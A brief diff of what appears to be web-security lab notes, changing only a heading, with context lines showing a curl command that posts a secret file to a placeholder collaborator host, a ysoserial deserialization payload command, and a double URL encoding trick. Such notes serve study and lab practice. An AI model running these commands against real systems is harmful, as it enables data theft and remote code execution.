@@ -36,7 +36,7 @@ curl -X POST <your-collaborator> -d @/home/carlos/secret
 java -jar ysoserial-all.jar CommonsBeanutils1 "CMD" | gzip | base64 -w0
 ```
 
-#Obfuscation
+# Obfuscation
 
 ## Double URL Encoding 
 ### The letter a = %2561
